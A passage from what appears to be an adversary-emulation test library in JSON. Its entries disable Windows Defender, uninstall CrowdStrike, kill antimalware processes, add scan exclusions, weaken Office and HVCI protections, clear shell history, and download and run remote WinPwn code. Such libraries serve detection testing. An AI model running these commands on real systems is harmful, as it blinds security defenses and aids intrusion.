                            "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
                            "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Remove Windows Defender Definition Files",
                        "auto_generated_guid": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68",
                        "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Stop and Remove Arbitrary Security Windows Service",
                        "auto_generated_guid": "ae753dda-0f15-4af6-a168-b9ba16143143",
                        "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "service_name": {
                                "description": "The name of the service to remove",
                                "type": "string",
                                "default": "McAfeeDLPAgentService"
                            }
                        },
                        "executor": {
                            "command": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Uninstall Crowdstrike Falcon on Windows",
                        "auto_generated_guid": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297",
                        "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "falcond_path": {
                                "description": "The Crowdstrike Windows Sensor path. The Guid always changes.",
                                "type": "path",
                                "default": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"
                            }
                        },
                        "executor": {
                            "command": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Evade Scanning -Folder",
                        "auto_generated_guid": "0b19f4ee-de90-4059-88cb-63c800c683ed",
                        "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "excluded_folder": {
                                "description": "This folder will be excluded from scanning",
                                "type": "path",
                                "default": "C:\\Temp"
                            }
                        },
                        "executor": {
                            "command": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath",
                            "cleanup_command": "$excludedpath= \"#{excluded_folder}\"\nRemove-MpPreference -ExclusionPath $excludedpath\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Evade Scanning -Extension",
                        "auto_generated_guid": "315f4be6-2240-4552-b3e1-d1047f5eecea",
                        "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "excluded_exts": {
                                "description": "A list of extension to exclude from scanning",
                                "type": "string",
                                "default": ".exe"
                            }
                        },
                        "executor": {
                            "command": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts",
                            "cleanup_command": "$excludedExts= \"#{excluded_exts}\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Evade Scanning -Process",
                        "auto_generated_guid": "a123ce6a-3916-45d6-ba9c-7d4081315c27",
                        "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "excluded_process": {
                                "description": "A list of processes to exclude from scanning",
                                "type": "string",
                                "default": "outlook.exe"
                            }
                        },
                        "executor": {
                            "command": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess",
                            "cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "office-365-Disable-AntiPhishRule",
                        "auto_generated_guid": "b9bbae2c-2ba6-4cf3-b452-8e8f908696f3",
                        "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
                        "supported_platforms": [
                            "office-365"
                        ],
                        "input_arguments": {
                            "username": {
                                "description": "office-365 username",
                                "type": "string",
                                "default": null
                            },
                            "password": {
                                "description": "office-365 password",
                                "type": "string",
                                "default": null
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "ExchangeOnlineManagement PowerShell module must be installed\n",
                                "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
                                "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n"
                            }
                        ],
                        "executor": {
                            "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n",
                            "cleanup_command": "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    },
                    {
                        "name": "Disable Windows Defender with DISM",
                        "auto_generated_guid": "871438ac-7d6e-432a-b27d-3e7db69faf58",
                        "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Defender Using NirSoft AdvancedRun",
                        "auto_generated_guid": "81ce22fd-9612-4154-918e-8a1f285d214d",
                        "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "AdvancedRun_Location": {
                                "description": "Path of Advanced Run executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
                            },
                            "delete_defender_folder": {
                                "description": "Set to 1 to also delete the Windows Defender folder",
                                "type": "integer",
                                "default": 0
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
                                "prereq_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
                            "cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Kill antimalware protected processes using Backstab",
                        "auto_generated_guid": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
                        "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "process_name": {
                                "description": "Name of the protected process you want to kill/terminate.",
                                "type": "string",
                                "default": "MsMpEng.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "WinPwn - Kill the event log services for stealth",
                        "auto_generated_guid": "7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66",
                        "description": "Kill the event log services for stealth via function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender ATP using Aliases - PowerShell",
                        "auto_generated_guid": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64",
                        "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n",
                            "cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd",
                        "auto_generated_guid": "d6d22332-d07d-498f-aea0-6139ecb7850e",
                        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd",
                        "auto_generated_guid": "9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70",
                        "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell",
                        "auto_generated_guid": "d8c57eaa-497a-4a08-961e-bd5efd7c9374",
                        "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n",
                            "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell",
                        "auto_generated_guid": "5e27f36d-5132-4537-b43b-413b0d5eec9a",
                        "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n",
                            "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature",
                        "auto_generated_guid": "f542ffd3-37b4-4528-837f-682874faa012",
                        "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "WMIC Tamper with Windows Defender Evade Scanning Folder",
                        "auto_generated_guid": "59d386fc-3a4b-41b8-850d-9e3eee24dfe4",
                        "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n",
                            "cleanup_command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"ATOMICREDTEAM\\\"\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Delete Windows Defender Scheduled Tasks",
                        "auto_generated_guid": "4b841aa1-0d05-4b32-bbe7-7564346e7c76",
                        "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependencies": [
                            {
                                "description": "The Windows Defender scheduled tasks must be backed up first\n",
                                "prereq_command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
                                "get_prereq_command": "schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n"
                            }
                        ],
                        "executor": {
                            "command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n",
                            "cleanup_command": "schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Clear History",
                        "auto_generated_guid": "23b88394-091b-4968-a42d-fb8076992443",
                        "description": "Clear Shell History. This technique only affect the bash shell application. \n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "history -c\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Suspend History",
                        "auto_generated_guid": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4",
                        "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "set +o history\n",
                            "cleanup_command": "set -o history\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Reboot Linux Host via Kernel System Request",
                        "auto_generated_guid": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e",
                        "description": "reboot system via system request seen in Awfulshred wiper.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Clear Pagging Cache",
                        "auto_generated_guid": "f790927b-ea85-4a16-b7b2-7eb44176a510",
                        "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Memory Swap",
                        "auto_generated_guid": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114",
                        "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "swapon -a \nsleep 2\nswapoff -a\nsync\n",
                            "cleanup_command": "swapon -a\nsleep 2\nsync\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Hypervisor-Enforced Code Integrity (HVCI)",
                        "auto_generated_guid": "70bd71e6-eba4-4e00-92f7-617911dbe020",
                        "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "HVCI must be enabled\n",
                                "prereq_command": "if (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f\n"
                            }
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n",
